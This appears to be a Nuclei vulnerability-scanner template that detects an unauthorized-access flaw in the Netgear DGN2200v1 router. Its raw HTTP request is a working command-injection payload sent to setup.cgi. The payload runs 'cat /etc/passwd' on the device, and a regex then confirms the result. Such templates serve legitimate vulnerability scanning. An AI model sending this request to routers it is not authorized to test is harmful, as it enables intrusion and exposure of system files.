id: netgear-dgn2200v1-unauthorized-access
info:
  name: Netgear DGN2200v1 Unauthorized Access
  author: ProjectDiscoveryAI
  severity: low
  description: |
    This template detects unauthorized access vulnerability in the Netgear DGN2200v1 router allowing access to sensitive files like `/etc/passwd`.
  reference:
    - http://www.securityfocus.com/bid/60281
http:
  - raw:
      - |
        GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat%20/etc/passwd&curpath=/&currentsetting.htm=1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"
        part: body
